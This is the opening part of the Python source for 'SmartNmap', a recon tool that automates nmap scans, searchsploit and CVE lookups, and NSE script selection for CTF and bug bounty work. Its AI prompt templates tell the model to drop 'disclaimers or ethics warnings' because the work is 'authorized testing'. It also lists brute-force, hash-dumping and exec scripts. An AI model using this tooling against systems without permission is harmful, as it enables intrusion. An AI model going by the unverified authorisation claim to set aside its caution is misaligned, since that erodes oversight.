#!/usr/bin/env python3
"""
SmartNmap v3.0 - Multi-Phase Intelligent Nmap Reconnaissance Framework
=======================================================================
The Swiss Army knife of nmap automation for CTF and bug bounty.
Adaptive multi-phase scanning, exploit lookup, vhost/subdomain discovery,
TLS deep inspection, loot extraction, CVE correlation, and markdown reporting.
Optional AI analysis via Gemini or Puter/Qwen.

Developed by Osama Hussien

Usage:
  smartnmap <target> [options]
  smartnmap 10.0.0.1 --ctf -ai           # CTF mode with AI analysis
  smartnmap target.com --bb -ai          # Bug bounty mode (safer)
  smartnmap 10.0.0.1 --full              # Full port scan (-p-)
  smartnmap 10.0.0.1 --ports 21,22,80    # Skip port discovery

Security:
  - Never hardcode API keys: set GEMINI_API_KEY env or ~/.config/smartnmap/config.json
  - AI features are fully optional; tool works without them
"""

import subprocess, sys, os, json, re, argparse, datetime, shutil, signal, time
import socket, threading, ipaddress, hashlib, random, queue, ssl
import xml.etree.ElementTree as ET
from pathlib import Path
from urllib.request import urlopen, Request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSION = "3.0.0"
GEMINI_MODEL = os.environ.get('GEMINI_MODEL', 'gemini-2.5-flash')
GEMINI_URL = f"https://generativelanguage.googleapis.com/v1beta/models/{GEMINI_MODEL}:generateContent"

# Config file lookup order: env -> ~/.config/smartnmap/config.json -> ~/.smartnmap.json
CONFIG_PATHS = [
    Path.home() / '.config' / 'smartnmap' / 'config.json',
    Path.home() / '.smartnmap.json',
    Path('/etc/smartnmap/config.json'),
]

def load_config():
    """Load config from known locations. Returns dict."""
    cfg = {}
    for p in CONFIG_PATHS:
        try:
            if p.exists():
                cfg.update(json.loads(p.read_text()))
                break
        except Exception:
            pass
    return cfg

_CONFIG = load_config()
GEMINI_DEFAULT_KEY = os.environ.get('GEMINI_API_KEY') or _CONFIG.get('gemini_api_key', '') or ''

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COLORS & DISPLAY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; Cy = '\033[96m'; W = '\033[97m'; Bo = '\033[1m'
    Di = '\033[2m'; Ul = '\033[4m'; Re = '\033[0m'
    BG_R = '\033[41m'; BG_G = '\033[42m'; BG_Y = '\033[43m'; BG_B = '\033[44m'

def info(msg):    print(f"  {C.B}[*]{C.Re} {msg}")
def good(msg):    print(f"  {C.G}[+]{C.Re} {msg}")
def warn(msg):    print(f"  {C.Y}[!]{C.Re} {msg}")
def error(msg):   print(f"  {C.R}[-]{C.Re} {msg}")
def ai_msg(msg):  print(f"  {C.M}[AI]{C.Re} {msg}")

def section(title):
    w = 70
    print(f"\n{C.Bo}{C.Cy}{'━'*w}{C.Re}")
    print(f"{C.Bo}{C.Cy}  {title}{C.Re}")
    print(f"{C.Bo}{C.Cy}{'━'*w}{C.Re}")

def subsection(title):
    print(f"\n  {C.Bo}{C.Y}--- {title} ---{C.Re}")

def banner():
    print(f"""{C.Cy}{C.Bo}
   ____                       _   _   _
  / ___| _ __ ___   __ _ _ __| |_| \\ | |_ __ ___   __ _ _ __
  \\___ \\| '_ ` _ \\ / _` | '__| __|  \\| | '_ ` _ \\ / _` | '_ \\
   ___) | | | | | | (_| | |  | |_| |\\  | | | | | | (_| | |_) |
  |____/|_| |_| |_|\\__,_|_|   \\__|_| \\_|_| |_| |_|\\__,_| .__/
                                                         |_|
{C.Re}{C.G}  v{VERSION} ── Multi-Phase Nmap Reconnaissance Framework{C.Re}
{C.Di}  CTF & Bug Bounty Swiss Army Knife  │  by Osama Hussien{C.Re}
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GEMINI AI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_last_gemini_call = 0
_GEMINI_MIN_INTERVAL = 2.0  # minimum seconds between API calls

def query_gemini(api_key, prompt, timeout=60, max_retries=3):
    """Query Gemini AI with rate limiting and retry on 429. Returns response text or None."""
    global _last_gemini_call
    if not api_key:
        return None

    # Rate limit: enforce minimum interval between calls
    elapsed = time.time() - _last_gemini_call
    if elapsed < _GEMINI_MIN_INTERVAL:
        time.sleep(_GEMINI_MIN_INTERVAL - elapsed)

    url = f"{GEMINI_URL}?key={api_key}"
    payload = json.dumps({
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {"temperature": 0.7, "maxOutputTokens": 8192}
    }).encode('utf-8')

    for attempt in range(max_retries):
        _last_gemini_call = time.time()
        req = Request(url, data=payload, headers={"Content-Type": "application/json"})
        try:
            with urlopen(req, timeout=timeout) as resp:
                result = json.loads(resp.read())
                candidates = result.get('candidates', [])
                if candidates:
                    parts = candidates[0].get('content', {}).get('parts', [])
                    if parts:
                        return parts[0].get('text', '')
            return None
        except urllib.error.HTTPError as e:
            if e.code in (429, 500, 502, 503, 504) and attempt < max_retries - 1:
                backoff = 4 * (2 ** attempt)  # 4s, 8s, 16s
                label = 'rate limited (429)' if e.code == 429 else f'server error ({e.code})'
                warn(f"Gemini {label}, retrying in {backoff}s... (attempt {attempt+1}/{max_retries})")
                time.sleep(backoff)
                continue
            warn(f"Gemini API error: HTTP {e.code} {e.reason}")
            return None
        except Exception as e:
            warn(f"Gemini API error: {e}")
            return None
    return None

def ai_phase_advisor(api_key, phase_name, context, question, puter_token=None):
    """Ask AI for advice at a specific phase. Returns advice string or None."""
    if not api_key and not _puter_pkg_available():
        return None
    prompt = f"""You are an expert penetration tester conducting a CTF/bug bounty engagement.
You are at the "{phase_name}" phase of an automated nmap reconnaissance.

CONTEXT:
{context}

QUESTION:
{question}

Respond concisely and technically. Include specific commands, script names, or tool suggestions where relevant.
Focus on actionable intelligence. No disclaimers or ethics warnings - this is authorized testing."""

    ai_msg(f"Consulting AI for {phase_name}...")
    response = query_ai(prompt, api_key=api_key, puter_token=puter_token)
    if response:
        ai_msg("AI response received")
    return response

def ai_github_nse_search(api_key, service_name, product, version, puter_token=None):
    """Ask AI to suggest GitHub NSE scripts for an unknown service."""
    if not api_key and not _puter_pkg_available():
        return None
    prompt = f"""I discovered a service during nmap scanning that I don't have specialized NSE scripts for:
Service: {service_name}
Product: {product}
Version: {version}

Search your knowledge for:
1. Any known nmap NSE scripts on GitHub specifically for this service/product
2. The GitHub raw URL to download the .nse file
3. Any known vulnerabilities for this exact version
4. Manual enumeration commands that would be useful

Be specific with URLs and commands. Only suggest real, known repositories."""

    return query_ai(prompt, api_key=api_key, puter_token=puter_token)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PUTER / QWEN AI (FALLBACK)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_PUTER_MODEL = "gpt-5.4-nano"  # free tier model via Puter User-Pays
_PUTER_PKG_OK = None           # cached package-check result


def _puter_pkg_available():
    """Check once if @heyputer/puter.js is installed on a compatible Node (>=18)."""
    global _PUTER_PKG_OK
    if _PUTER_PKG_OK is not None:
        return _PUTER_PKG_OK
    if not shutil.which('node'):
        _PUTER_PKG_OK = False
        return False
    try:
        # Check Node version >= 18
        r = subprocess.run(['node', '-e', 'process.exit(parseInt(process.versions.node)<18?1:0)'],
                           capture_output=True, timeout=5)
        if r.returncode != 0:
            warn("Puter AI requires Node.js >=18 (run: nvm install 18 or apt install nodejs)")
            _PUTER_PKG_OK = False
            return False
        r = subprocess.run(
            ['node', '-e', 'require("@heyputer/puter.js"); process.exit(0)'],
            capture_output=True, timeout=6)
        _PUTER_PKG_OK = (r.returncode == 0)
    except Exception:
        _PUTER_PKG_OK = False
    return _PUTER_PKG_OK


def query_puter_ai(prompt, model=None, timeout=90):
    """Query GPT via Puter.js User-Pays model — no API key required.
    Only needs: npm install -g @heyputer/puter.js  (and node on PATH)."""
    if not _puter_pkg_available():
        return None
    model = model or _PUTER_MODEL
    import base64
    b64_prompt = base64.b64encode(prompt.encode()).decode()
    # Puter.js works anonymously in Node.js — no init(token) needed
    script = (
        'const puter=require("@heyputer/puter.js");'
        'const pr=Buffer.from(process.env._PP,"base64").toString("utf8");'
        'puter.ai.chat(pr,{model:process.env._PM}).then(r=>{'
        'const t=typeof r==="string"?r:'
        '(r&&r.message&&r.message.content?r.message.content:'
        '(r&&r.text?r.text:JSON.stringify(r)));'
        'process.stdout.write(t);'
        '}).catch(e=>{process.stderr.write(String(e));process.exit(1)});'
    )
    env = {**os.environ, '_PP': b64_prompt, '_PM': model}
    try:
        result = subprocess.run(['node', '-e', script],
                                capture_output=True, text=True, timeout=timeout, env=env)
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
        if result.stderr:
            warn(f"Puter AI error: {result.stderr[:200]}")
        return None
    except subprocess.TimeoutExpired:
        warn("Puter AI timed out")
        return None
    except Exception:
        return None


def query_ai(prompt, api_key=None, puter_token=None, timeout=60):
    """Unified AI query: Gemini first, then Puter/GPT (no key needed) as fallback."""
    if api_key:
        result = query_gemini(api_key, prompt, timeout=timeout)
        if result:
            return result
    # Puter is always tried as fallback — no token needed
    result = query_puter_ai(prompt, timeout=timeout)
    if result:
        return result
    return None


def ai_phase_advisor_v2(api_key, puter_token, phase_name, context, question):
    """Ask AI for advice at a specific phase. Uses unified provider fallback."""
    if not api_key and not _puter_pkg_available():
        return None
    prompt = f"""You are an expert penetration tester conducting a CTF/bug bounty engagement.
You are at the "{phase_name}" phase of an automated nmap reconnaissance.

CONTEXT:
{context}

QUESTION:
{question}

Respond concisely and technically. Include specific commands, script names, or tool suggestions where relevant.
Focus on actionable intelligence. No disclaimers or ethics warnings - this is authorized testing."""
    ai_msg(f"Consulting AI for {phase_name}...")
    response = query_ai(prompt, api_key=api_key, puter_token=puter_token)
    if response:
        ai_msg("AI response received")
    return response

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SEARCHSPLOIT & CVE INTEGRATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_searchsploit(query, json_output=True):
    """Run searchsploit and return results. Returns list of dicts or raw text."""
    if not shutil.which('searchsploit'):
        return [] if json_output else ''
    try:
        args = ['searchsploit']
        if json_output:
            args.append('-j')
        args.extend(['--disable-colour', query])
        r = subprocess.run(args, capture_output=True, text=True, timeout=30)
        if json_output:
            try:
                data = json.loads(r.stdout)
                exploits = data.get('RESULTS_EXPLOIT', [])
                shellcodes = data.get('RESULTS_SHELLCODE', [])
                return exploits + shellcodes
            except json.JSONDecodeError:
                return []
        return r.stdout
    except subprocess.TimeoutExpired:
        return [] if json_output else ''
    except Exception:
        return [] if json_output else ''


def run_searchsploit_nmap(xml_file):
    """Run searchsploit --nmap against an nmap XML file. Returns text output."""
    if not shutil.which('searchsploit') or not Path(xml_file).exists():
        return ''
    try:
        r = subprocess.run(['searchsploit', '--nmap', str(xml_file), '--disable-colour'],
                           capture_output=True, text=True, timeout=60)
        return r.stdout if r.returncode == 0 else ''
    except Exception:
        return ''



# Maps nmap product strings (lowercase) to additional searchsploit-friendly aliases.
# Nmap often reports a different name than what exploitdb uses.
PRODUCT_ALIASES = {
    # ── HTTP File Servers ──
    'httpfileserver':               ['HFS', 'Rejetto HFS'],
    'hfs':                          ['HFS', 'Rejetto HFS'],
    'rejetto httpfileserver':       ['HFS', 'Rejetto HFS'],
    # ── Web / App Servers ──
    'microsoft-iis':                ['IIS', 'Microsoft IIS'],
    'microsoft iis httpd':          ['IIS', 'Microsoft IIS'],
    'microsoft iis':                ['IIS'],
    'apache httpd':                 ['Apache'],
    'apache':                       ['Apache'],
    'nginx':                        ['Nginx'],
    'lighttpd':                     ['Lighttpd'],
    'cherokee httpd':               ['Cherokee'],
    'openresty':                    ['OpenResty', 'Nginx'],
    # ── Java App Servers ──
    'apache tomcat':                ['Tomcat', 'Apache Tomcat'],
    'apache tomcat/coyote':         ['Tomcat', 'Apache Tomcat'],
    'apache-coyote':                ['Tomcat', 'Apache Tomcat'],
    'jetty':                        ['Jetty', 'Eclipse Jetty'],
    'jboss':                        ['JBoss'],
    'jboss jmx-console':            ['JBoss'],
    'wildfly':                      ['WildFly', 'JBoss WildFly'],
    'weblogic':                     ['WebLogic', 'Oracle WebLogic'],
    'websphere':                    ['WebSphere', 'IBM WebSphere'],
    'glassfish':                    ['GlassFish'],
    'payara':                       ['Payara', 'GlassFish'],
    # ── SSH ──
    'openssh':                      ['OpenSSH'],
    'openssh for_windows':          ['OpenSSH', 'OpenSSH Windows'],
    'dropbear sshd':                ['Dropbear', 'Dropbear SSH'],
    'libssh':                       ['libssh'],
    'bitvise':                      ['Bitvise'],
    # ── FTP ──
    'proftpd':                      ['ProFTPD'],
    'vsftpd':                       ['vsftpd'],
    'pure-ftpd':                    ['Pure-FTPd', 'PureFTPd'],
    'filezilla ftpd':               ['FileZilla'],
    'filezilla server':             ['FileZilla'],
    'microsoft ftpd':               ['Microsoft FTP'],
    'war-ftpd':                     ['War-FTPd'],
    'gene6 ftpd':                   ['Gene6 FTP'],
    'globalscape eft':              ['GlobalSCAPE EFT'],
    # ── SMTP ──
    'postfix smtpd':                ['Postfix'],
    'exim smtpd':                   ['Exim'],
    'exim':                         ['Exim'],
    'sendmail':                     ['Sendmail'],
    'microsoft esmtp':              ['Exchange', 'Microsoft Exchange'],
    'hmail server':                 ['hMailServer'],
    # ── IMAP/POP3 ──
    'dovecot imapd':                ['Dovecot'],
    'dovecot pop3d':                ['Dovecot'],
    'cyrus imapd':                  ['Cyrus IMAP'],
    'uw imapd':                     ['UW-IMAP'],
    # ── Databases ──
    'mysql':                        ['MySQL'],
    'mysql community server':       ['MySQL'],
    'mariadb':                      ['MariaDB', 'MySQL'],
    'microsoft sql server':         ['MSSQL', 'Microsoft SQL'],
    'postgresql':                   ['PostgreSQL'],
    'mongodb':                      ['MongoDB'],
    'redis':                        ['Redis'],
    'couchdb':                      ['CouchDB'],
    'elasticsearch':                ['Elasticsearch'],
    'cassandra':                    ['Cassandra', 'Apache Cassandra'],
    'memcached':                    ['Memcached'],
    'riak':                         ['Riak'],
    'influxdb':                     ['InfluxDB'],
    'neo4j':                        ['Neo4j'],
    'orientdb':                     ['OrientDB'],
    'cockroachdb':                  ['CockroachDB'],
    # ── CMS / Web Apps ──
    'wordpress':                    ['WordPress'],
    'drupal':                       ['Drupal'],
    'joomla':                       ['Joomla'],
    'typo3':                        ['TYPO3'],
    'magento':                      ['Magento'],
    'moodle':                       ['Moodle'],
    'liferay':                      ['Liferay'],
    'sharepoint':                   ['SharePoint', 'Microsoft SharePoint'],
    # ── DevOps / CI ──
    'jenkins':                      ['Jenkins'],
    'gitlab':                       ['GitLab'],
    'confluence':                   ['Confluence', 'Atlassian Confluence'],
    'jira':                         ['Jira', 'Atlassian JIRA'],
    'bamboo':                       ['Bamboo', 'Atlassian Bamboo'],
    'bitbucket':                    ['Bitbucket', 'Atlassian Bitbucket'],
    'teamcity':                     ['TeamCity'],
    'nexus':                        ['Nexus', 'Sonatype Nexus'],
    'sonarqube':                    ['SonarQube'],
    'artifactory':                  ['Artifactory', 'JFrog Artifactory'],
    # ── Monitoring ──
    'nagios':                       ['Nagios'],
    'zabbix':                       ['Zabbix'],
    'grafana':                      ['Grafana'],
    'kibana':                       ['Kibana'],
    'prometheus':                   ['Prometheus'],
    'icinga':                       ['Icinga'],
    'checkmk':                      ['Check_MK'],
    # ── Messaging / Queue ──
    'activemq':                     ['ActiveMQ', 'Apache ActiveMQ'],
    'rabbitmq':                     ['RabbitMQ'],
    'kafka':                        ['Kafka', 'Apache Kafka'],
    # ── Network / Proxy ──
    'squid http proxy':             ['Squid'],
    'squid':                        ['Squid'],
    'haproxy':                      ['HAProxy'],
    'varnish':                      ['Varnish'],
    'f5 big-ip':                    ['F5 BIG-IP'],
    'citrix':                       ['Citrix'],
    # ── Directory / Auth ──
    'openldap':                     ['OpenLDAP'],
    '389 directory server':         ['389-ds'],
    'freeipa':                      ['FreeIPA'],
    'active directory':             ['Active Directory'],
    # ── VPN / Remote Access ──
    'openvpn':                      ['OpenVPN'],
    'openssl':                      ['OpenSSL'],
    'webmin':                       ['Webmin'],
    'webmin httpd':                 ['Webmin'],
    'virtualmin':                   ['Virtualmin', 'Webmin'],
    # ── Windows Specific ──
    'microsoft httpapi httpd':      ['WinRM', 'IIS'],
    'exchange httpapi':             ['Exchange', 'Microsoft Exchange'],
    'microsoft windows rpc':        ['MSRPC'],
    # ── Networking / Embedded ──
    'mikrotik':                     ['MikroTik', 'RouterOS'],
    'routeros':                     ['MikroTik', 'RouterOS'],
    'cisco':                        ['Cisco'],
    'cisco ios':                    ['Cisco IOS'],
    'pfsense':                      ['pfSense'],
    'openwrt':                      ['OpenWrt'],
    'fortinet':                     ['Fortinet'],
    # ── VNC / RDP ──
    'vnc':                          ['VNC'],
    'realvnc':                      ['RealVNC'],
    'tightvnc':                     ['TightVNC'],
    'ultravnc':                     ['UltraVNC'],
    # ── Container / Cloud ──
    'docker':                       ['Docker'],
    'kubernetes':                   ['Kubernetes'],
    'etcd':                         ['etcd'],
    'consul':                       ['Consul'],
    'vault':                        ['Vault', 'HashiCorp Vault'],
    # ── IRCd ──
    'unrealircd':                   ['UnrealIRCd'],
    'inspircd':                     ['InspIRCd'],
    'ngircd':                       ['ngIRCd'],
    # ── Misc ──
    'nagios nrpe':                  ['NRPE', 'Nagios NRPE'],
    'cups':                         ['CUPS'],
    'zimbra':                       ['Zimbra'],
    'minio':                        ['MinIO'],
    'spring':                       ['Spring', 'Spring Framework'],
    'struts':                       ['Struts', 'Apache Struts'],
}

# Noise words to strip when dynamically normalizing product names
_PRODUCT_NOISE = re.compile(
    r'\b(httpd|server|daemon|service|the|for_windows|for_linux|for_macos|'
    r'community|enterprise|open source|open-source|httpapi|http|smtpd|'
    r'imapd|pop3d|ftpd|sshd|db|database|api|rest|rpc|proxy)\b',
    re.IGNORECASE
)


def _product_query_variants(product, version):
    """Return a de-duplicated list of searchsploit query strings for a product."""
    variants = []
    p = product.strip()
    v = (version or '').strip()

    # 1. Exact name + version, exact name only
    if p and v:
        variants.append(f"{p} {v}")
    if p:
        variants.append(p)

    # 2. Known alias map
    for alias in PRODUCT_ALIASES.get(p.lower(), []):
        if v:
            variants.append(f"{alias} {v}")
        variants.append(alias)

    # 3. Dynamic: strip noise words and retry
    stripped = _PRODUCT_NOISE.sub('', p).strip()
    stripped = re.sub(r'\s+', ' ', stripped).strip()
    if stripped and stripped.lower() != p.lower() and len(stripped) > 2:
        if v:
            variants.append(f"{stripped} {v}")
        variants.append(stripped)

    # 4. Dynamic: CamelCase acronym (HttpFileServer → HFS)
    acronym = ''.join(c for c in p if c.isupper())
    if len(acronym) >= 2 and acronym.lower() != p.lower():
        if v:
            variants.append(f"{acronym} {v}")
        variants.append(acronym)

    # 5. Major version only (strip patch: 2.3.1 → 2.3)
    if v:
        major = re.match(r'^(\d+\.\d+)', v)
        if major and major.group(1) != v:
            variants.append(f"{p} {major.group(1)}")
            for alias in PRODUCT_ALIASES.get(p.lower(), []):
                variants.append(f"{alias} {major.group(1)}")

    # De-duplicate preserving order, drop empty/short entries
    seen = set()
    result = []
    for q in variants:
        q = q.strip()
        if len(q) < 3 or q.lower() in seen:
            continue
        seen.add(q.lower())
        result.append(q)
    return result


def searchsploit_services(services, outdir=None):
    """Run searchsploit for all identified services. Returns dict of {query: [results]}."""
    if not shutil.which('searchsploit'):
        return {}
    all_results = {}
    seen_queries = set()
    for port, svc in services.items():
        product = svc.get('product', '').strip()
        version = svc.get('version', '').strip()
        if not product:
            continue
        queries = _product_query_variants(product, version)
        for query in queries:
            if query in seen_queries or len(query) < 3:
                continue
            seen_queries.add(query)
            results = run_searchsploit(query)
            if results:
                all_results[query] = results
                # Print summary
                good(f"  searchsploit '{query}': {len(results)} exploit(s) found")
                for r in results[:3]:
                    title = r.get('Title', '')
                    edb_id = r.get('EDB-ID', '')
                    print(f"    {C.Y}[EDB-{edb_id}]{C.Re} {title}")
                if len(results) > 3:
                    print(f"    {C.Di}... and {len(results)-3} more{C.Re}")
    # Save to file
    if outdir and all_results:
        lines = ["# Searchsploit Results\n"]
        for query, results in all_results.items():
            lines.append(f"\n## Query: {query}")
            for r in results:
                edb_id = r.get('EDB-ID', '')
                title = r.get('Title', '')
                path = r.get('Path', '')
                lines.append(f"- [EDB-{edb_id}] {title}")
                if path:
                    lines.append(f"  Path: {path}")
        (outdir / 'searchsploit_results.md').write_text('\n'.join(lines))
    return all_results


def cve_lookup_circl(product, version=''):
    """Lookup CVEs via cve.circl.lu API. Returns list of CVE dicts or []."""
    query = product.replace(' ', '+')
    if version:
        query += f"+{version.replace(' ', '+')}"
    url = f"https://cve.circl.lu/api/search/{query}"
    try:
        req = Request(url, headers={"Accept": "application/json", "User-Agent": "SmartNmap/2.0"})
        with urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
            if isinstance(data, list):
                return data[:10]
            if isinstance(data, dict) and 'results' in data:
                return data['results'][:10]
            return []
    except Exception:
        return []


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SERVICE → NSE SCRIPT MAPPING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SERVICE_SCRIPTS = {
    'ftp': [
        'ftp-anon', 'ftp-bounce', 'ftp-syst', 'ftp-libopie',
        'ftp-proftpd-backdoor', 'ftp-vsftpd-backdoor', 'ftp-vuln-cve2010-4221',
    ],
    'ssh': ['ssh-auth-methods', 'ssh-hostkey', 'ssh2-enum-algos'],
    'telnet': ['telnet-encryption', 'telnet-ntlm-info'],
    'smtp': [
        'smtp-commands', 'smtp-enum-users', 'smtp-open-relay',
        'smtp-vuln-cve2010-4344', 'smtp-vuln-cve2011-1720', 'smtp-ntlm-info',
    ],
    'domain': ['dns-recursion', 'dns-zone-transfer', 'dns-brute', 'dns-nsid', 'dns-srv-enum', 'dns-cache-snoop'],
    'dns': ['dns-recursion', 'dns-zone-transfer', 'dns-brute', 'dns-nsid', 'dns-srv-enum', 'dns-cache-snoop'],
    'http': [
        'http-methods', 'http-headers', 'http-title', 'http-robots.txt',
        'http-auth-finder', 'http-server-header', 'http-cors',
        'http-shellshock', 'http-enum', 'http-open-redirect',
        'http-put', 'http-trace', 'http-backup-finder', 'http-config-backup',
        'http-default-accounts', 'http-webdav-scan', 'http-iis-webdav-vuln',
        'http-php-version', 'http-wordpress-enum', 'http-wordpress-users',
        'http-drupal-enum', 'http-drupal-enum-users', 'http-joomla-brute',
        'http-csrf', 'http-dombased-xss', 'http-stored-xss',
        'http-vuln-cve2017-5638', 'http-vuln-cve2014-3704',
        'http-vuln-cve2015-1635', 'http-vuln-cve2017-1001000',
        'http-vuln-cve2017-5689', 'http-vuln-cve2017-8917',
        'http-git', 'http-svn-info', 'http-svn-enum',
        'http-security-headers', 'http-cookie-flags',
        'http-waf-detect', 'http-waf-fingerprint',
        'http-sitemap-generator', 'http-userdir-enum',
        'http-internal-ip-disclosure', 'http-ntlm-info',
        'http-apache-negotiation', 'http-apache-server-status',
        'http-iis-short-name-brute',
    ],
    'ssl': [
        'ssl-cert', 'ssl-enum-ciphers', 'ssl-heartbleed', 'ssl-dh-params',
        'ssl-poodle', 'ssl-ccs-injection', 'ssl-date', 'ssl-known-key',
        'ssl-cert-intaddr',
    ],
    'netbios-ssn': [
        'smb-security-mode', 'smb-enum-shares', 'smb-enum-users',
        'smb-enum-groups', 'smb-enum-domains', 'smb-enum-services',
        'smb-enum-sessions', 'smb-os-discovery', 'smb-ls', 'smb-system-info',
        'smb-server-stats', 'smb-protocols',
        'smb-vuln-ms08-067', 'smb-vuln-ms10-054', 'smb-vuln-ms10-061',
        'smb-vuln-ms17-010', 'smb-vuln-cve-2017-7494',
        'smb-vuln-conficker', 'smb-vuln-cve2009-3103',
        'smb-vuln-ms06-025', 'smb-vuln-ms07-029',
        'smb-vuln-regsvc-dos', 'smb-vuln-webexec',
        'smb-double-pulsar-backdoor',
        'smb2-capabilities', 'smb2-security-mode', 'smb2-time', 'smb2-vuln-uptime',
    ],
    'microsoft-ds': [
        'smb-security-mode', 'smb-enum-shares', 'smb-enum-users',
        'smb-vuln-ms17-010', 'smb-vuln-cve-2017-7494', 'smb-os-discovery',
        'smb-protocols', 'smb2-security-mode', 'smb-double-pulsar-backdoor',
    ],
    'rpcbind': ['rpcinfo', 'nfs-ls', 'nfs-showmount', 'nfs-statfs'],
    'nfs': ['nfs-ls', 'nfs-showmount', 'nfs-statfs'],
    'nfs_acl': ['nfs-ls', 'nfs-showmount', 'nfs-statfs'],
    'mountd': ['nfs-showmount', 'nfs-ls', 'nfs-statfs'],
    'nlockmgr': [],
    'mysql': [
        'mysql-info', 'mysql-databases', 'mysql-users', 'mysql-variables',
        'mysql-empty-password', 'mysql-vuln-cve2012-2122',
        'mysql-enum', 'mysql-dump-hashes', 'mysql-audit',
    ],
    'ms-sql-s': [
        'ms-sql-info', 'ms-sql-config', 'ms-sql-tables',
        'ms-sql-empty-password', 'ms-sql-dac', 'ms-sql-ntlm-info',
        'ms-sql-dump-hashes', 'ms-sql-hasdbaccess',
    ],
    'postgresql': ['pgsql-brute'],
    'oracle-tns': ['oracle-sid-brute', 'oracle-enum-users', 'oracle-brute'],
    'mongodb': ['mongodb-info', 'mongodb-databases'],
    'redis': ['redis-info'],
    'memcache': ['memcached-info'],
    'cassandra': ['cassandra-info', 'cassandra-brute'],
    'snmp': [
        'snmp-info', 'snmp-interfaces', 'snmp-netstat', 'snmp-processes',
        'snmp-sysdescr', 'snmp-brute', 'snmp-hh3c-logins',
        'snmp-win32-software', 'snmp-win32-services', 'snmp-win32-shares', 'snmp-win32-users',
    ],
    'ldap': ['ldap-search', 'ldap-brute', 'ldap-rootdse', 'ldap-novell-getpass'],
    'ms-wbt-server': ['rdp-enum-encryption', 'rdp-vuln-ms12-020', 'rdp-ntlm-info'],
    'vnc': ['vnc-info', 'vnc-brute', 'vnc-title'],
    'pop3': ['pop3-capabilities', 'pop3-ntlm-info'],
    'imap': ['imap-capabilities', 'imap-ntlm-info'],
    'irc': ['irc-info', 'irc-unrealircd-backdoor', 'irc-botnet-channels'],
    'rtsp': ['rtsp-methods', 'rtsp-url-brute'],
    'sip': ['sip-enum-users', 'sip-methods'],
    'kerberos-sec': ['krb5-enum-users'],
    'http-proxy': ['http-proxy-brute', 'http-open-proxy'],
    'ajp13': ['ajp-auth', 'ajp-brute', 'ajp-headers'],
    'elasticsearch': ['http-title', 'http-methods'],
    # ── File Transfer ──
    'tftp': ['tftp-enum'],
    'rsync': ['rsync-list-modules', 'rsync-brute'],
    # ── Remote Access ──
    'rlogin': ['rlogin-brute'],
    'rexec': ['rexec-brute'],
    'rsh': [],
    # ── Databases (additional) ──
    'couchdb': ['couchdb-databases', 'couchdb-stats'],
    'hbase': ['hbase-master-info', 'hbase-region-info'],
    'informix': ['informix-brute', 'informix-query', 'informix-tables'],
    'drda': ['drda-brute', 'drda-info'],
    'riak': [],
    'orientdb': [],
    'neo4j': [],
    'influxdb': [],
    'cockroachdb': [],
    'clickhouse': [],
    # ── Message Queues / Brokers ──
    'amqp': ['amqp-info'],
    'mqtt': ['mqtt-subscribe'],
    'activemq': [],
    'rabbitmq': ['amqp-info'],
    'kafka': [],
    'nats': [],
    'zeromq': [],
    'stomp': [],
    # ── Java Services ──
    'rmiregistry': ['rmi-dumpregistry', 'rmi-vuln-classloader'],
    'java-rmi': ['rmi-dumpregistry', 'rmi-vuln-classloader'],
    'jdwp': ['jdwp-version', 'jdwp-info', 'jdwp-exec'],
    'jmxrmi': ['rmi-dumpregistry'],
    # ── Printing ──
    'ipp': ['ipp-info', 'cups-info', 'cups-queue-info'],
    'printer': ['pjl-ready-message'],
    'jetdirect': ['pjl-ready-message'],
    'bjnp': [],
    # ── VoIP / Telephony ──
    'iax2': ['iax2-version'],
    'iax': ['iax2-version'],
    'skinny': [],
    'mgcp': [],
    'h323': [],
    'h225': [],
    'megaco': [],
    # ── Industrial / SCADA / ICS ──
    'modbus': ['modbus-discover'],
    'bacnet': ['bacnet-info'],
    's7comm': ['s7-info'],
    'enip': ['enip-info'],
    'ethernetip': ['enip-info'],
    'fox': ['fox-info'],
    'pcworx': [],
    'omron-fins': [],
    'codesys': [],
    'dnp3': [],
    'opcua': [],
    'iec-104': [],
    'profinet': [],
    'hart-ip': [],
    'crimson-v3': [],
    # ── Network Services ──
    'ntp': ['ntp-info', 'ntp-monlist'],
    'dhcps': ['dhcp-discover'],
    'upnp': ['upnp-info'],
    'ssdp': ['upnp-info'],
    'pptp': ['pptp-version'],
    'l2tp': [],
    'ike': [],
    'stun': ['stun-info', 'stun-version'],
    'turn': [],
    'wsdd': [],
    'llmnr': [],
    'mdns': [],
    'nbns': [],
    # ── Mainframe ──
    'tn3270': ['tn3270-screen', 'tso-brute', 'tso-enum'],
